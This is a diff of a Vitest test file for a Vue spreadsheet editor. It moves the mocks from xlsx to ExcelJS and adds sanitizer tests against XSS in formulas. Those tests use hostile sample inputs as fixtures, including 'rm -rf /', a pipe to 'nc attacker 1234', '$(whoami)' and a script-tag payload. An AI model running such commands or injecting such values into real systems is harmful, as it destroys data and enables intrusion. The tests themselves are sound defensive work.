@@ -11,48 +11,57 @@ const h = vi.hoisted(() => {
     };
     const instance = { worksheets: [ws], destroy: vi.fn() };
     return {
-        ws, instance, cfg: { onselection: undefined as undefined | ((w: unknown, x: number, y: number) => void) },
+        ws, instance,
+        cfg: { onselection: undefined as undefined | ((w: unknown, x: number, y: number) => void) },
         jss: vi.fn(),
         getArrayBuffer: vi.fn(() => Promise.resolve(new ArrayBuffer(8))),
-        xlsxWrite: vi.fn(() => new Uint8Array([1, 2, 3, 4])),
+        xlsxLoad: vi.fn(() => Promise.resolve()),
+        xlsxWriteBuffer: vi.fn(() => Promise.resolve(new Uint8Array([1, 2, 3, 4]))),
     };
 });
 
 vi.mock('jspreadsheet-ce', () => ({
-    default: (el: unknown, cfg: { onselection?: () => void }) => { h.cfg.onselection = cfg.onselection as never; return h.instance; },
+    default: (el: unknown, cfg: { onselection?: () => void }) => {
+        h.cfg.onselection = cfg.onselection as never;
+        return h.instance;
+    },
 }));
 vi.mock('jspreadsheet-ce/dist/jspreadsheet.css', () => ({}));
 vi.mock('jsuites/dist/jsuites.css', () => ({}));
 vi.mock('@/lib/http', () => ({ getArrayBuffer: h.getArrayBuffer }));
 
-const workbook = {
-    SheetNames: ['Sheet1'],
-    Sheets: {
-        Sheet1: {
-            '!ref': 'A1:B2',
-            '!merges': [{ s: { r: 0, c: 0 }, e: { r: 0, c: 1 } }],
-            '0:0': { v: 1, w: '1', t: 'n' },
-            '0:1': { f: 'A1+1' },
-            '1:0': { v: 'x', t: 's' },
+// Minimal ExcelJS workbook mock: one sheet with two data rows and one merge.
+vi.mock('exceljs', () => {
+    const sheet = {
+        name: 'Sheet1',
+        model: { merges: ['A1:B1'] },
+        eachRow: (opts: unknown, cb: (row: { cellCount: number; getCell: (c: number) => { value: unknown; text: string; formula?: string } }, ri: number) => void) => {
+            cb({ cellCount: 2, getCell: (c: number) => c === 1 ? { value: 1, text: '1' } : { value: { formula: 'A1+1' }, text: '2', formula: 'A1+1' } }, 1);
+            cb({ cellCount: 1, getCell: () => ({ value: 'x', text: 'x' }) }, 2);
         },
-    },
-};
-vi.mock('xlsx', () => ({
-    read: vi.fn(() => workbook),
-    write: h.xlsxWrite,
-    utils: {
-        decode_range: vi.fn(() => ({ s: { r: 0, c: 0 }, e: { r: 1, c: 1 } })),
-        encode_cell: vi.fn(({ r, c }: { r: number; c: number }) => `${r}:${c}`),
-        encode_range: vi.fn(() => 'A1:B2'),
-        book_new: vi.fn(() => ({ SheetNames: [], Sheets: {} })),
-        book_append_sheet: vi.fn(),
-        aoa_to_sheet: vi.fn(() => ({ '!ref': 'A1' })),
-    },
-}));
+        getCell: vi.fn((_r: number, _c: number) => ({ get value() { return null as unknown; }, set value(_v: unknown) {} })),
+        addRow: vi.fn(),
+    };
+    return {
+        default: {
+            Workbook: class {
+                worksheets = [sheet];
+                addWorksheet = vi.fn(() => sheet);
+                xlsx = { load: h.xlsxLoad, writeBuffer: h.xlsxWriteBuffer };
+            },
+        },
+    };
+});
 
 import SpreadsheetEditor from '@/Components/SpreadsheetEditor.vue';
+import { sanitizeFormula } from '@/lib/sanitizeFormula';
 
-beforeEach(() => { h.getArrayBuffer.mockClear(); h.xlsxWrite.mockClear(); h.ws.setValueFromCoords.mockClear(); });
+beforeEach(() => {
+    h.getArrayBuffer.mockClear();
+    h.xlsxLoad.mockClear();
+    h.xlsxWriteBuffer.mockClear();
+    h.ws.setValueFromCoords.mockClear();
+});
 
 describe('SpreadsheetEditor', () => {
     it('loads a workbook and emits ready', async () => {
@@ -72,7 +81,6 @@ describe('SpreadsheetEditor', () => {
     it('syncs the formula bar on cell selection and commits edits', async () => {
         const wrapper = mount(SpreadsheetEditor, { props: { url: '/raw/1', type: 'xlsx' } });
         await flushPromises();
-        // Drive the jspreadsheet selection callback the editor registered.
         h.cfg.onselection!(h.ws, 1, 2);
         await flushPromises();
         expect(wrapper.find('.cell-ref').text()).toBe('B3');
@@ -86,7 +94,7 @@ describe('SpreadsheetEditor', () => {
         const wrapper = mount(SpreadsheetEditor, { props: { url: '/raw/1', type: 'xlsx' } });
         await flushPromises();
         const blob = await (wrapper.vm as unknown as { serialize: () => Promise<Blob> }).serialize();
-        expect(h.xlsxWrite).toHaveBeenCalled();
+        expect(h.xlsxWriteBuffer).toHaveBeenCalled();
         expect(blob).toBeInstanceOf(Blob);
     });
 
@@ -95,5 +103,30 @@ describe('SpreadsheetEditor', () => {
         await flushPromises();
         expect(wrapper.emitted('ready')).toBeTruthy();
         expect(h.getArrayBuffer).not.toHaveBeenCalled();
+    });
+});
+
+describe('sanitizeFormula (HI-15: defense in depth against jspreadsheet-ce EOL XSS)', () => {
+    it('passes through normal formulas', () => {
+        expect(sanitizeFormula('=SUM(A1:A2)')).toBe('=SUM(A1:A2)');
+        expect(sanitizeFormula('=IF(A1="x",1,0)')).toBe('=IF(A1="x",1,0)');
+        expect(sanitizeFormula('=A1+B1*2')).toBe('=A1+B1*2');
+    });
+
+    it('passes through non-formula values unchanged', () => {
+        expect(sanitizeFormula('hello')).toBe('hello');
+        expect(sanitizeFormula(42)).toBe('42');
+        expect(sanitizeFormula(null)).toBe('');
+        expect(sanitizeFormula(undefined)).toBe('');
+    });
+
+    it('neutralizes formulas containing dangerous characters', () => {
+        // Backticks, $(), semicolons, pipes, ampersands, angle brackets
+        expect(sanitizeFormula('=SUM(A1)`malicious`')).toBe('=');
+        expect(sanitizeFormula('=$(whoami)')).toBe('=');
+        expect(sanitizeFormula('=SUM; rm -rf /')).toBe('=');
+        expect(sanitizeFormula('=A1 | nc attacker 1234')).toBe('=');
+        expect(sanitizeFormula('=<script>alert(1)</script>')).toBe('=');
+        expect(sanitizeFormula('=A1\\nwhoami')).toBe('=');
     });
 });
